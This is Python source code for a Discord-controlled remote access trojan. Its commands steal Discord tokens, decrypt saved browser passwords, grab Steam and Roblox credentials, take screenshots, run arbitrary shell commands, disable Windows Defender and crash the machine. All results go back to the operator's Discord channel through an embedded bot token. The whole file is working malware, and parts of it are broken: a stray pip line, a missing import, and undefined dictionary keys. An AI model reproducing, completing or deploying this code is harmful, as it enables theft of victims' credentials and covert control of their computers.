import discord
from discord.ext import commands
import os
import sys
import subprocess
import psutil
import pyautogui
import ctypes
from pynput import keyboard as kb
import asyncio
import time
import socket
import threading
import getpass
import platform
import cv2
from datetime import datetime
import base64
import win32crypt
import sqlite3
import re
import requests
import json
import winreg as reg
from urllib.parse import urlparse
from PIL import ImageGrab
import numpy as np
import sounddevice as sd
import wave
import browser_cookie3
from Cryptodome.Cipher import AES
from colorama import Fore, init

pip install --upgrade pip

init()

# Bot token
HzzH = "MTM3ODE4MjU1ODY4ODQ4MTQ0MQ.GDewIa.jT7xSvILybvCh44VIZNPLM1i9ECuZLIWQV1pyc"

# Intents and bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guild_messages = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# Global variables
key_log = []
keylog_listener = None
reverse_mouse = False
cpu_stress_running = False
shaking_task = None
input_blocked = False
temp_folder = os.getenv("TEMP")
hwid_list = {}
current_directory = os.getcwd()
hzzh_path = os.path.join(temp_folder, "rat_client.exe")
hzzh_path1 = os.path.join(temp_folder, "rat_client_temp.exe")

# Check admin rights
def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

# Get system info
def get_system_info():
    pc_name = platform.node()
    ip_address = requests.get("https://api.ipify.org").text 
    system_version = platform.platform()
    cpu_usage = f"{psutil.cpu_percent()}%"
    ram_usage = f"{psutil.virtual_memory().percent}%"
    disk = psutil.disk_usage('/')
    disk_usage = f"{disk.percent}% used of {disk.total // (1024 ** 3)} GB"
    geolocation = "Unknown"
    try:
        geolocation_data = requests.get("https://ipinfo.io/json").json() 
        geolocation = geolocation_data.get("city", "Unknown")
    except Exception as e:
        pass
    return {
        "PC Name": pc_name,
        "IP Address": ip_address,
        "Geolocation": geolocation,
        "System Version": system_version,
        "CPU Usage": cpu_usage,
        "RAM Usage": ram_usage,
        "Disk Info": disk_usage
    }

# Create session channel for victim
async def create_session_channel(guild, name):
    existing = discord.utils.get(guild.channels, name=name.lower())
    if existing:
        await existing.delete()
    channel = await guild.create_text_channel(name)
    return channel

# On ready
@bot.event
async def on_ready():
    print(f"[+] Bot {bot.user} is online.")

# !information - Show system info
@bot.command()
async def information(ctx):
    info = get_system_info()
    embed = discord.Embed(title="🖥️ System Information", color=discord.Color.blue())
    for key, value in info.items():
        embed.add_field(name=key, value=value, inline=False)
    await ctx.send(embed=embed)

# !tokens - Steal Discord tokens
@bot.command()
async def tokens(ctx):
    tokens = []
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        'Discord': os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    }
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith('.log') or file.endswith('.ldb'):
                try:
                    with open(os.path.join(path, file), errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            match = re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line)
                            if match:
                                tokens.extend(match)
                except:
                    pass
    if tokens:
        unique_tokens = list(set(tokens))
        embed = discord.Embed(title="🔑 Found Discord Tokens", color=discord.Color.green())
        for token in unique_tokens[:25]:
            embed.add_field(name="Token", value=f"``{token}``", inline=False)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="❌ No Tokens Found", description="Could not find any tokens.", color=discord.Color.red())
        await ctx.send(embed=embed)

# !passwords - Steal saved passwords from browsers
BROWSERS = {
    "chrome": {
        "path": os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "edge": {
        "path": os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    },
    "brave": {
        "path": os.path.expanduser(r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data'),
        "profiles": r"Default|Guest Profile|Profile \d+",
        "login_db": r"Login Data"
    }
}

# Decrypt password logic
def get_master_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = ctypes.WinDLL('crypt32.dll').CryptUnprotectData(
            ctypes.c_char_p(encrypted_key),
            None, None, None, None, 0
        )[1]
        return master_key
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return "Unknown"

def get_browser_passwords(browser_name, data):
    passwords = []
    browser_path = data["path"]
    profile_pattern = data["profiles"]

    if not os.path.exists(browser_path):
        return []

    profiles = [f for f in os.listdir(browser_path) if re.match(profile_pattern, f)]
    for profile in profiles:
        db_path = os.path.join(browser_path, profile, "Login Data")
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(temp_folder, f"{browser_name}_{profile}_Login_Data.db")
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        master_key = get_master_key(browser_path)
        if not master_key:
            conn.close()
            os.remove(temp_db)
            continue

        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]

            decrypted_password = decrypt_password(encrypted_password, master_key)

            passwords.append({
                "url": url,
                "username": username,
                "password": decrypted_password
            })

        conn.close()
        os.remove(temp_db)
    return passwords

@bot.command()
async def passwords(ctx):
    all_passwords = []
    for browser_name, data in BROWSERS.items():
        passwords = get_browser_passwords(browser_name, data)
        all_passwords.extend(passwords)

    if all_passwords:
        output = "**🔐 Saved Passwords:**\n\n"
        for entry in all_passwords:
            output += (
                f"URL: {entry['url']}\n"
                f"Username: {entry['username']}\n"
                f"Password: {entry['password']}\n"
                f"Browser: {entry['browser']} ({entry['profile']})\n"
                f"{'-' * 30}\n"
            )
        await ctx.send(output[:1900])
    else:
        await ctx.send("[+] No passwords found.")

# !screen - Take screenshot
@bot.command()
async def screen(ctx):
    screenshot_path = os.path.join(temp_folder, "screenshot.png")
    img = ImageGrab.grab()
    img.save(screenshot_path)
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)

# !exec - Execute command
@bot.command()
async def exec(ctx, *, cmd: str):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    result_str = result.decode('utf-8', errors='ignore')
    if len(result_str) > 1900:
        with open("exec_output.txt", "w") as f:
            f.write(result_str)
        await ctx.send(file=discord.File("exec_output.txt"))
        os.remove("exec_output.txt")
    else:
        await ctx.send(f"```\n{result_str}\n```")

# !geolocation - Get geographic location
@bot.command()
async def geolocation(ctx):
    response = requests.get("https://ipinfo.io/json").json() 
    await ctx.send(f"📍 Location: {response}")

# !bsod - Trigger Blue Screen Of Death
@bot.command()
async def bsod(ctx):
    if is_admin():
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            await ctx.send("BSOD executed!")
        except Exception as e:
            await ctx.send(f"Error: {e}")
    else:
        await ctx.send("Admin privileges required.")

# !disabledefender - Disable Windows Defender
@bot.command()
async def disabledefender(ctx):
    if is_admin():
        os.system("sc stop WinDefend >nul & sc config WinDefend start=disabled >nul")
        await ctx.send("Windows Defender disabled.")
    else:
        await ctx.send("Admin privileges required.")

# !reboot - Restart PC
@bot.command()
async def reboot(ctx):
    await ctx.send("Restarting system...")
    os.system("shutdown /r /t 0")

# !minimize - Simulate Win+D
@bot.command()
async def minimize(ctx):
    pyautogui.hotkey('win', 'd')
    await ctx.send("All windows minimized.")

# !steam - Get Steam account info
@bot.command()
async def steam(ctx):
    steam_path = os.path.join(os.getenv("ProgramFiles(x86)"), "Steam", "config", "loginusers.vdf")
    if os.path.exists(steam_path):
        with open(steam_path, "r") as f:
            content = f.read()
        await ctx.send(f"🦺 Steam Account:\n```\n{content[:1900]}\n```")
    else:
        await ctx.send("[!] Steam not found.")

# !roblox - Get Roblox cookies
@bot.command()
async def roblox(ctx):
    cookies_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox", "logs", "http.log")
    if os.path.exists(cookies_path):
        with open(cookies_path, "r") as f:
            data = f.read()
        await ctx.send(f"🦺 Roblox Cookies:\n```\n{data[:1900]}\n```")
    else:
        await ctx.send("[!] No Roblox logs found.")

# !help - Command list
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📚 Help Menu", color=discord.Color.blue())
    embed.add_field(name="!information", value="Get system information", inline=False)
    embed.add_field(name="!passwords", value="Steal saved browser passwords", inline=False)
    embed.add_field(name="!tokens", value="Steal Discord tokens", inline=False)
    embed.add_field(name="!screen", value="Take a screenshot", inline=False)
    embed.add_field(name="!exec [cmd]", value="Execute CMD command", inline=False)
    embed.add_field(name="!geolocation", value="Get IP geolocation", inline=False)
    embed.add_field(name="!bsod", value="Trigger BSOD", inline=False)
    embed.add_field(name="!disabledefender", value="Disable Windows Defender", inline=False)
    embed.add_field(name="!reboot", value="Reboot target PC", inline=False)
    embed.add_field(name="!minimize", value="Simulate Win+D", inline=False)
    embed.add_field(name="!steam", value="Get Steam account info", inline=False)
    embed.add_field(name="!roblox", value="Get Roblox cookies", inline=False)
    await ctx.send(embed=embed)

# Run the bot
bot.run(HzzH)
